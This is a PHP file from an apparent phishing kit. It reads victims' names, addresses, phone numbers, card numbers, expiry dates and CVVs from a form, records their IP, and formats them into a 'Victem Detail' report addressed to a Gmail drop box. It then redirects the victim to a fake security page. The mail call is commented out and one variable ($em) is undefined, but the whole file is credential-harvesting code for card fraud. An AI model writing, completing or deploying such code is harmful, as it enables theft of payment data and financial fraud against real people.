<?php
$name = $_POST['name'] ; 
$phone = $_POST['mobilePhone'] ; 
$add = $_POST['add'] ; 
$city = $_POST['city'] ; 
$zipcode = $_POST['zip'] ; 

$cardnum = $_POST['card'] ; 
$exp = $_POST['months'] ; 
$exp1 = $_POST['years'] ; 
$cvvv = $_POST['cvv'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 $to="fibans0123@gmail.com" ; 
 $subject = "Abv  Fullz :D | Happy Cash |: from: ".$ip;
$headers = "From:Abv.Rzlt";

$message  = "------------------+ Victem Detail :D  +-----------------\r\n";
$message .= "Name Vectim : ".$name."\r\n";
$message .= "Addresss: " .$add."\r\n";
$message .= "ville: " .$city."\r\n";
$message .= "zip code : " .$zipcode."\r\n";
$message .= "Emaill: " .$em."\r\n";
$message .= "Phonee : " .$phone."\r\n";
$message .= "---------------+ Card Information :D  +---------------\r\n";
$message .= "Card Number: " .$cardnum."\r\n";
$message .= "Date D'exp : " .$exp.'/'.$exp1."\r\n";
$message .= "Cvv: ".$cvvv. "\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By jen +------------------\r\n";
//mail($to,$subject,$headers,$message);
header('Location: ../security');


?>